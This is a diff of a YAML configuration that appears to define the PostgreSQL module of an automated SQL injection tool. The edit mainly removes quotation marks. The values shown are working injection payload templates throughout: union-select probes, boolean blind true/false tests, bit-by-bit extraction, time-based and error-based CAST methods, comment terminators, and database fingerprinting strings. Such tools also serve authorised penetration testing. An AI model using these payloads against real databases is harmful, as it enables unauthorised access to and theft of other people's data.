@@ -1,4 +1,4 @@
-vendor: ""
+vendor: 
 resource: 
  info: |
   concat_ws(
@@ -107,7 +107,7 @@ resource:
         )
         || '${TRAIL_SQL}'
    fields: 
-    field: "trim(coalesce(${FIELD}::text, ''))"
+    field: trim(coalesce(${FIELD}::text, ''))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -126,40 +126,40 @@ strategy:
            ),
            '${TRAIL_SQL}'
        )
-  limit: "limit 65536 offset ${LIMIT}"
-  failsafe: "(1337${INDICE}7330%2b1)::text"
-  calibrator: "repeat(chr(35), 1024)"
+  limit: limit 65536 offset ${LIMIT}
+  failsafe: (1337${INDICE}7330%2b1)::text
+  calibrator: repeat(chr(35), 1024)
   limitBoundary: 0
-  endingComment: "--+-"
+  endingComment: --+-
   fingerprint: 
    errorMessage: 
     - "ERROR: unterminated quoted identifier at or near"
     - "Query failed: ERROR:  unterminated quoted string at or near"
-    - "function\\\\.pg"
+    - function\\.pg
     - PostgreSQL
     
  normal: 
-  indices: "union select ${INDICES}"
-  capacity: "(select '${LEAD}' || ${INDICE} || ${CALIBRATOR})"
-  orderBy: "order by 1337"
+  indices: union select ${INDICES}
+  capacity: (select '${LEAD}' || ${INDICE} || ${CALIBRATOR})
+  orderBy: order by 1337
   
  boolean: 
   test: 
    falses: 
-    - "true = false"
-    - "true %21= true"
-    - "false %21= false"
-    - "1 = 2"
-    - "1 %21= 1"
-    - "2 %21= 2"
+    - true = false
+    - true %21= true
+    - false %21= false
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
    trues: 
-    - "true = true"
-    - "false = false"
-    - "true %21= false"
-    - "1 = 1"
-    - "2 = 2"
-    - "1 %21= 2"
-   initialization: "0%2b1 = 1"
+    - true = true
+    - false = false
+    - true %21= false
+    - 1 = 1
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
    bit: |
     /**
      * true bit return bit, false bit return 0
@@ -175,9 +175,9 @@ strategy:
         ) 
         %26 ${BIT}
     )
-   length: "char_length((${INJECTION})) > ${INDEX}"
+   length: char_length((${INJECTION})) > ${INDEX}
    
-  blind: "and ${TEST}"
+  blind: and ${TEST}
   
   time: |
    and ''='' 
@@ -191,7 +191,7 @@ strategy:
    
  error: 
   method: 
-   - name: "CAST::text_numeric"
+   - name: CAST::text_numeric
      query: |
       /* Require FALSE statement, then OR */
       and 1 = 0 
